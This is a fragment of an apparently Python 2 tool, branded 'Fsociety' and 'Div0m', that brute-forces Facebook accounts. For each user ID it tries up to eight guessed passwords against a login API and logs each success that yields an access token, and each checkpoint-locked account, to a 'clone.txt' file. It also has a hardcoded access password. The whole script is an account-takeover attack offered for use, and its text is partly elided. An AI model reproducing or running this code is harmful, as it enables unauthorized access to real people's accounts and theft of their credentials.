...
vuln = '\x1b[32mVuln'
os.system('clear')
logo = '--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : </>Fsociety/>     \n\x1b[1;97m\xe2\x9e\xa3 Telegram  : Divombot \n\x1b[1;97m\xe2\x9e\xa3 Snap :it.div0m \n\x1b[1;97m\xe2\x9e\xa3 Tb : drwstkrawe (Ahmad Dev) \n\x1b[1;97m--------------------------------------------------\n'
logo2 = ""
CorrectUsername = 'AhmadDev@@'
CorrectPassword = 'div0m$@'
os.system('clear')
print logo2
loop = 'true'
while loop == 'true':
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('anggaxd/clone.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        ...
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[Div0m GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[Div0m Cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
